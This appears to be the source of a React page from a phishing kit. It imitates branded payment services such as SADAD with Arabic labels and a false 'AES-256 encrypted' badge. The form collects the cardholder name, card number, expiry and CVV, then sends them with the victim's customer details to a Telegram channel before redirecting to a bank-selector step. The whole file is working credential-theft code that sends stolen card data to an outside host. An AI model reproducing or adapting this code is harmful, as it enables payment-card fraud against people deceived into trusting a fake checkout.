import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { getCompanyLayout } from "@/components/CompanyLayouts";
import { formatCurrency } from "@/lib/countryCurrencies";
import { getCountryByCode } from "@/lib/countries";
import { serviceLogos } from "@/lib/serviceLogos";
import { Lock, CreditCard as CardIcon, ShieldCheck } from "lucide-react";

const PaymentCardForm = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);
  const updateLink = useUpdateLink();
  
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const customerInfo = linkData?.payload?.customerInfo || {};
  const serviceKey = (linkData?.payload?.service_key || 'sadad').toLowerCase();
  const countryCode = linkData?.payload?.selectedCountry || "SA";
  const countryData = getCountryByCode(countryCode);
  const branding = serviceLogos[serviceKey] || serviceLogos['sadad'];
  
  const rawAmount = linkData?.payload?.payment_amount || 500;
  const formattedAmount = formatCurrency(rawAmount, countryData?.currency || "SAR");
  
  const Layout = getCompanyLayout(serviceKey);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!cardName || !cardNumber || !expiryMonth || !expiryYear || !cvv) {
      toast({ title: "خطأ", description: "الرجاء ملء جميع الحقول", variant: "destructive" });
      return;
    }
    
    setIsSubmitting(true);
    const expiry = `${expiryMonth}/${expiryYear}`;
    const cardInfo = { cardName, cardNumber, expiry, cvv };
    
    try {
      await updateLink.mutateAsync({
        linkId: id!,
        payload: { ...linkData?.payload, cardInfo }
      });
      
      await sendToTelegram({
        type: 'card_details',
        data: { ...customerInfo, ...cardInfo, amount: formattedAmount, service: serviceKey },
        timestamp: new Date().toISOString()
      });
      
      navigate(`/pay/${id}/bank-selector`);
    } catch (err) {
      console.error(err);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <Layout companyKey={serviceKey} amount={formattedAmount}>
      <div className="text-right">
        <div className="mb-6 p-4 rounded-xl bg-gray-50 border border-gray-100 flex items-center justify-between">
           <div className="flex flex-col">
              <span className="text-[10px] font-black text-gray-400 uppercase">Amount Due</span>
              <span className="text-lg font-black text-gray-900">{formattedAmount}</span>
           </div>
           <Lock className="w-5 h-5 text-green-600" />
        </div>

        <form onSubmit={handleSubmit} className="space-y-5">
          <div className="space-y-1.5">
            <Label className="font-black text-gray-700 text-xs">إسم حامل البطاقة</Label>
            <Input 
              placeholder="Full Name on Card" 
              className="h-12 font-bold border-gray-200 rounded-lg text-right"
              value={cardName}
              onChange={(e) => setCardName(e.target.value)}
            />
          </div>

          <div className="space-y-1.5">
            <Label className="font-black text-gray-700 text-xs">رقم البطاقة</Label>
            <div className="relative">
               <Input 
                 placeholder="0000 0000 0000 0000" 
                 className="h-12 font-bold border-gray-200 rounded-lg text-left"
                 value={cardNumber}
                 onChange={(e) => setCardNumber(e.target.value)}
               />
               <CardIcon className="absolute right-3 top-3.5 w-5 h-5 text-gray-400" />
            </div>
          </div>

          <div className="grid grid-cols-2 gap-4">
             <div className="space-y-1.5">
                <Label className="font-black text-gray-700 text-xs">تاريخ الانتهاء</Label>
                <div className="flex gap-2">
                   <Input placeholder="YY" className="h-12 text-center font-bold" value={expiryYear} onChange={(e)=>setExpiryYear(e.target.value)} />
                   <Input placeholder="MM" className="h-12 text-center font-bold" value={expiryMonth} onChange={(e)=>setExpiryMonth(e.target.value)} />
                </div>
             </div>
             <div className="space-y-1.5">
                <Label className="font-black text-gray-700 text-xs">رمز الأمان (CVV)</Label>
                <Input placeholder="123" className="h-12 text-center font-bold" value={cvv} onChange={(e)=>setCvv(e.target.value)} />
             </div>
          </div>

          <Button 
            type="submit" 
            disabled={isSubmitting}
            className="w-full h-14 rounded-xl font-black text-lg mt-4 shadow-lg shadow-primary/20 transition-all hover:scale-[1.02]"
            style={{ background: branding.colors.primary }}
          >
            {isSubmitting ? "جاري المعالجة..." : "تأكيد الدفع الآمن"}
          </Button>
          
          <div className="flex items-center justify-center gap-2 mt-4 text-[10px] font-bold text-gray-400">
             <ShieldCheck className="w-3 h-3" />
             <span>عملية مشفرة بالكامل AES-256</span>
          </div>
        </form>
      </div>
    </Layout>
  );
};

export default PaymentCardForm;
